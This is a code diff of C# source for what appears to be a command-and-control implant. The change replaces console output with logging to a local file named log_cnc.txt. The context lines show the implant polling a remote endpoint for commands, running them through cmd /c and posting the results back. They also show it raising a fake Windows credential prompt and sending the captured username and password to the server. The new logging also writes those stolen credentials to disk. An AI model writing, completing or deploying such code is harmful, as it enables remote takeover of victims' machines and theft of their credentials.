@@ -12,7 +12,13 @@ using System.Runtime.InteropServices;
 using Microsoft.Win32.SafeHandles;
 
 //The code redefines few things !!!
-
+public class Output
+{
+	public static void WriteLine(string log)
+	{
+		File.AppendAllText(@"log_cnc.txt", DateTime.Now.ToString()+"--"+log + Environment.NewLine);
+	}
+}
 public class Furqan_c_and_c
 {
 	
@@ -28,12 +34,12 @@ public class Furqan_c_and_c
 			khan_p.StartInfo = khan_pr;
 			khan_p.Start();
 			string result = khan_p.StandardOutput.ReadToEnd();
-			Console.WriteLine(result);
+			Output.WriteLine(result);
 			return result;
       }
       catch (Exception ex)
       {
-		Console.WriteLine("(1): " + ex.Message);
+		Output.WriteLine("(1): " + ex.Message);
 		return "0";
       }
 }
@@ -41,7 +47,7 @@ public class Furqan_c_and_c
 {
      try
      {
-			Console.WriteLine("About to execute command : " + command.ToString());
+			Output.WriteLine("About to execute command : " + command.ToString());
 			System.Diagnostics.ProcessStartInfo khan_pr =new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
 			khan_pr.RedirectStandardOutput = true;
 			khan_pr.UseShellExecute = false;
@@ -54,7 +60,7 @@ public class Furqan_c_and_c
       }
       catch (Exception ex)
       {
-		Console.WriteLine("(1): " + ex.Message);
+		Output.WriteLine("(1): " + ex.Message);
 		
       }
 }
@@ -69,7 +75,7 @@ public class Furqan_c_and_c
 	   }
 	   catch (Exception ex)
 	   {
-		Console.WriteLine("(4): " +ex.Message);
+		Output.WriteLine("(4): " +ex.Message);
 	   }
 	}
 	
@@ -79,7 +85,7 @@ class Furqan_D
 	public string PostTheData(string endpoint, string json)
 	{
     		
-			Console.WriteLine("(2) End point is : " +endpoint);
+			Output.WriteLine("(2) End point is : " +endpoint);
     		string jsonResponse = string.Empty;
  
     		using (var client = new WebClient())
@@ -94,7 +100,7 @@ class Furqan_D
             		var uri = new Uri(endpoint);
            		    var response = client.UploadString(uri, "POST", json);
             		jsonResponse = response;
-					Console.WriteLine("DATA written");
+					Output.WriteLine("DATA written");
 					WebHeaderCollection myWebHeaderCollection = client.ResponseHeaders;
        			 }
         	catch (WebException ex)
@@ -103,17 +109,17 @@ class Furqan_D
             		if (ex.Status == WebExceptionStatus.ProtocolError)
             		{
 						 string response = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
-						 Console.WriteLine("Error is :" +response);
+						 Output.WriteLine("Error is :" +response);
 						HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
 						var statusCode = (int)wrsp.StatusCode;
 						var msg = wrsp.StatusDescription;
-						Console.WriteLine("Exception : " + msg + wrsp.StatusCode);
+						Output.WriteLine("Exception : " + msg + wrsp.StatusCode);
 						return msg;
                		
             		}
             		else
             		{
-                		Console.WriteLine("Exception 11" + ex.Message);
+                		Output.WriteLine("Exception 11" + ex.Message);
 						return ex.Message;
             		}
         		}
@@ -127,7 +133,7 @@ class Furqan_D
 		{
    			 try
     			{
-				Console.WriteLine("(1) End point is : " +endpoint);
+				Output.WriteLine("(1) End point is : " +endpoint);
         		client.BaseAddress = endpoint;
         		client.UseDefaultCredentials = true;
 				string credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes("password" + ":" + "password"));
@@ -142,19 +148,19 @@ class Furqan_D
                		 	HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
                 		var statusCode = (int)wrsp.StatusCode;
                 		var msg = wrsp.StatusDescription;
-						Console.WriteLine("Exception : " + msg);
+						Output.WriteLine("Exception : " + msg);
 						return "0";
                			
             		}
             		else
 					{
-                		Console.WriteLine("Exception 11" + ex.Message);
+                		Output.WriteLine("Exception 11" + ex.Message);
 						return "0";
             		}
 				}
 			catch(Exception ex)
 			{
-				Console.WriteLine("Genera; Exception " + ex.Message);
+				Output.WriteLine("Genera; Exception " + ex.Message);
 				return "0";
 			}
 	}
@@ -177,7 +183,7 @@ class Furqan_D
 			string [] splitted=command_args.Split(',');
 			foreach (string command in splitted)
 			{
-				Console.WriteLine("Command is : " +command);
+				Output.WriteLine("Command is : " +command);
 				Process khan_process = new Process();
 				try
 				{
@@ -202,7 +208,7 @@ class Furqan_D
 				}
 				catch (Exception e)
 				{
-					Console.WriteLine("(0) Exception :" +e.Message);
+					Output.WriteLine("(0) Exception :" +e.Message);
 				}
 			}
 			
@@ -210,7 +216,7 @@ class Furqan_D
 		}
 		catch(Exception ex)
 		{
-			Console.WriteLine(ex.Message);
+			Output.WriteLine(ex.Message);
 		}
 		
 		while(true)
@@ -233,7 +239,7 @@ class Furqan_D
 					string type=command_details[2];
 					if(command_type.Equals("1"))
 					{
-						Console.WriteLine("(a) Recievied New command: " +command_details[1]);
+						Output.WriteLine("(a) Recievied New command: " +command_details[1]);
 						
 						 if (type.Equals("1") || type.Equals("0"))
 						{
@@ -241,13 +247,13 @@ class Furqan_D
 							
 								new_command="0"+","+command_details[1]+","+command_details[2];
 								var res2=obj.PostTheData(updated_ep0,new_command);
-								Console.WriteLine("Updated Resp : " +res2);
+								Output.WriteLine("Updated Resp : " +res2);
 								string result="";
 								if(command.Equals("<cred_prompt>"))
 								{
 									Program.Start();
-									Console.WriteLine("Diff class : " +Program.f_user);
-									Console.WriteLine("Diff class : " +Program.f_pass);
+									Output.WriteLine("Diff class : " +Program.f_user);
+									Output.WriteLine("Diff class : " +Program.f_pass);
 									result="Username : " + Program.f_user + "\n Password :"+ Program.f_pass;
 								}
 								else
@@ -263,23 +269,23 @@ class Furqan_D
 						
 						else 
 						{
-							Console.WriteLine("(b) Invalid type : " +type);
+							Output.WriteLine("(b) Invalid type : " +type);
 						}
 					}
 					else
 					{
-							Console.WriteLine("(1) No new command  "+command_type);
+							Output.WriteLine("(1) No new command  "+command_type);
 					}
 				}
 				else
 				{
-					Console.WriteLine("(**) No new command  "+resp2);
+					Output.WriteLine("(**) No new command  "+resp2);
 				}
-				Console.WriteLine("Resp obtained : "+resp2);
+				Output.WriteLine("Resp obtained : "+resp2);
 				}
 				catch(Exception ex)
 				{
-					Console.WriteLine("Exception : " +ex.Message);
+					Output.WriteLine("Exception : " +ex.Message);
 					//sw.Write(ex.Message);
 				}
 				}
@@ -386,8 +392,8 @@ class Furqan_D
 
             userName = user.ToString();
             password = pwd.ToString();
-            Console.WriteLine("User Entered :" + userName);
-            Console.WriteLine("Pass Entered :" + password);
+            Output.WriteLine("User Entered :" + userName);
+            Output.WriteLine("Pass Entered :" + password);
             f_user = user.ToString();
             f_pass = pwd.ToString();
             return result;
@@ -411,9 +417,9 @@ class Furqan_D
             bool savePwd = false;
             CredUIReturnCodes result = PromptForCredentials(ref info, host, 0, ref username,
                           ref password, ref savePwd, flags);
-            Console.WriteLine("Final result : ");
-            Console.WriteLine(Program.f_user);
-            Console.WriteLine(Program.f_pass);
+            Output.WriteLine("Final result : ");
+            Output.WriteLine(Program.f_user);
+            Output.WriteLine(Program.f_pass);
              
         }
     }
